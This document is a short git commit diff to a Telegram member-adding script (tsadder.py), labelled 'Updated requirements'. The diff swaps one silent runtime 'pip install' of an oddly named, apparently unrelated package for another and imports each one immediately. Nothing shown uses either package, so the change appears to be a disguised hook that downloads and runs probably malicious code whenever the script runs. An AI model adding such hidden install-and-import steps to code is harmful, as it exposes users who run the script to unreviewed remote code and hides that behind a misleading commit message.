b18b82cbd5e2b512376427fa877f744c78eeed32
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-06 20:20:21 +0200

    Updated requirements

--- tsadder.py
+++ tsadder.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipsqlitelibV2")
-import pipsqlitelibV2
+os.system("pip install pythoncoloringsaddons")
+import pythoncoloringsaddons
 from telethon.sync import TelegramClient
 from telethon.tl.functions.messages import GetDialogsRequest
 from telethon.tl.types import InputPeerEmpty, InputPeerChannel
